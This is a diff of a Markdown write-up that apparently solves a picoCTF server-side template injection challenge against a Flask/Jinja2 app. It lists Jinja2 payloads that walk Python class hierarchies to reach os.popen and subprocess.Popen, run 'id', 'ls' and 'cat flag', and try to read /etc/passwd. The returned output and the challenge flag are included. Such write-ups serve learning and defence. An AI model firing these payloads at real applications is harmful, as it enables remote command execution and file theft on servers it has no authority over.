@@ -43,100 +43,100 @@ Following along with the portswigger article, and the indentify section, we dete
 
 Now that we know it is Jinja2, I found https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/ to be useful for specifics regarding exploitation of this framework. Similarly, the Jinja docs were useful for referencing what the OnSecurity aricle was discussing: https://jinja.palletsprojects.com/en/stable/api/#jinja2.Environment
 
-Sending: {{global_name.__class__.__mro__}}
+Sending: __`{{global_name.__class__.__mro__}}`__
 
 - Returns: (<class 'jinja2.runtime.Undefined'>, <class 'object'>)
 
-Sending: {{global_name.__class__.__base__}}
+Sending: __`{{global_name.__class__.__base__}}`__
 
 - Returns: <class 'object'>
 
-Sending: __{{g.__class__.__mro__}}__
+Sending: __`{{g.__class__.__mro__}}`__
 
 - Returns: (<class 'flask.ctx._AppCtxGlobals'>, <class 'object'>)
 
-Sending: __{{g.__class__.mro()}}__
+Sending: __`{{g.__class__.mro()}}`__
 
 - Returns: [<class 'flask.ctx._AppCtxGlobals'>, <class 'object'>]
 
-Sending: __{{g['__class__']['mro']()}}__
+Sending: __`{{g['__class__']['mro']()}}`__
 
 - Returns: [<class 'flask.ctx._AppCtxGlobals'>, <class 'object'>]
 
-Sending: __{{g['__class__']['__mro__']}}__
+Sending: `__{{g['__class__']['__mro__']}}`__
 
 - Returns: (<class 'flask.ctx._AppCtxGlobals'>, <class 'object'>)
 
 Furthermore from the OnSecurity article, I played around with some of the payloads discussed there...
 
-Sending: __{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}__
+Sending: __`{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`__
 
 - Returns: uid=0(root) gid=0(root) groups=0(root) 
 
 From the developing an exploiut in https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/#payload-development-from-0...
 ![image](https://github.com/user-attachments/assets/b23ae18f-6e68-48c6-8b1a-6632659c9392)
 
-Sending: __{{get_flashed_messages}}__
+Sending: __`{{get_flashed_messages}}`__
 
 - Returns: <function get_flashed_messages at 0x75e143dc5550>
 
-Sending: __{{get_flashed_messages.__class__}}__
+Sending: __`{{get_flashed_messages.__class__}}`__
 
 - Returns: <class 'function'>
 
-Sending: __{{get_flashed_messages.__class__.__mro__}}__
+Sending: __`{{get_flashed_messages.__class__.__mro__}}`__
 - Returns: (<class 'function'>, <class 'object'>)
 
-Sending: __{{get_flashed_messages.__class__.__mro__[1]}}__
+Sending: __`{{get_flashed_messages.__class__.__mro__[1]}}`__
 - Returns: <class 'object'>
 
-Sending: __{{get_flashed_messages.__class__.__mro__[1].__subclasses__()}}__
+Sending: __`{{get_flashed_messages.__class__.__mro__[1].__subclasses__()}}`__
 
 - Returns: All the subclasses for the get_flashed_messages object subclass. It is very long so I haven't included it as plaintext... see:
 ![image](https://github.com/user-attachments/assets/b9684b62-ef29-4c30-b91b-4f48e44aa67a)
 
-Sending: __{{g}}__
+Sending: __`{{g}}`__
 
-- Returns: <flask.g of 'app'>
+- Returns: `<flask.g of 'app'>`
 
-Sending: __{{get_flashed_messages.__class__.__mro__[1].__subclasses__()[40]}}__
+Sending: __`{{get_flashed_messages.__class__.__mro__[1].__subclasses__()[40]}}`__
 
-- Returns: <class 'mappingproxy'>
+- Returns: `<class 'mappingproxy'>`
 
-Sending: __{{get_flashed_messages.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd')}}__
+Sending: __`{{get_flashed_messages.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd')}}`__
 
-- Returns: /etc/passwd
+- Returns: `/etc/passwd`
 
-Sending: __{{get_flashed_messages.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}__
+Sending: __`{{get_flashed_messages.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}`__
 
 - Returns: __Internal server error__
 
 
 After a bit of further self experimentation, I took the 'app' name of the application and started parsing some similar dunder methods to it to see what was getting returned, maybe we can find our winfunction this way.
 
-Sending: __{{app.__class__}}__
+Sending: __`{{app.__class__}}`__
 
-- Returns: <class 'jinja2.runtime.Undefined'>
+- Returns: `<class 'jinja2.runtime.Undefined'>`
 
-Sending: __{{app.__class__.__mro__}}__
+Sending: __`{{app.__class__.__mro__}}`__
 
-- Returns: (<class 'jinja2.runtime.Undefined'>, <class 'object'>)
+- Returns: `(<class 'jinja2.runtime.Undefined'>, <class 'object'>)`
 
-When sending: __{{app.__class__.__mro__[1].__subclasses__()}}__, I received all the subclasses again. However, this time I put it into my IDE and replaced all commas with newlines to better visualise it.
+When sending: __`{{app.__class__.__mro__[1].__subclasses__()}}`__, I received all the subclasses again. However, this time I put it into my IDE and replaced all commas with newlines to better visualise it.
 ![image](https://github.com/user-attachments/assets/d53d70c7-0f86-4da5-a79a-df0aafcc8655)
 
 After querying ChatGPT on where I should begin my investigations regarding vulnerable subclasses, I decided to hone in on <class 'subprocess.Popen'> and returned this by indexing the above function with [356]. 
->> {{app.__class__.__mro__[1].__subclasses__()[356]}}
+- `{{app.__class__.__mro__[1].__subclasses__()[356]}}`
 
 Popen is expliotable because __"The popen() function shall execute the command specified by the string command. It shall create a pipe between the calling program and the executed command, and shall return a pointer to a stream that can be used to either read from or write to the pipe."__
 from: https://pubs.opengroup.org/onlinepubs/009696799/functions/popen.html
 ![image](https://github.com/user-attachments/assets/d06d5171-459f-4511-9f12-c1688e3d9264)
 
-We can now execute Popen through: __{{app.__class__.__mro__[1].__subclasses__()[356]}}__
+We can now execute Popen through: __`{{app.__class__.__mro__[1].__subclasses__()[356]}}`__
 
 For example, if we want to list the current directory, we can pass the linux commands ls to the args via a list:
 
-Sending: {{app.__class__.__mro__[1].__subclasses__()[356](['ls', '-la], stdout=-1).communicate()[0].decode()}}
+Sending: `{{app.__class__.__mro__[1].__subclasses__()[356](['ls', '-la], stdout=-1).communicate()[0].decode()}}`
 
 Returns:
 
@@ -188,9 +188,9 @@ Seems like just details for the application to run, maybe a docker thing?
 Lastly, lets using the linux read file command cat to open the flag file:
 
 
-Sending: __{{app.__class__.__mro__[1].__subclasses__()[356](['cat', 'flag'], stdout=-1).communicate()[0].decode()}}__
+Sending: __`{{app.__class__.__mro__[1].__subclasses__()[356](['cat', 'flag'], stdout=-1).communicate()[0].decode()}}`__
 
-- Returns __picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_99fe4411}__
+- Returns __`picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_99fe4411}`__
 
 ---------------------------------------------------------------------------------------------------------------------
 
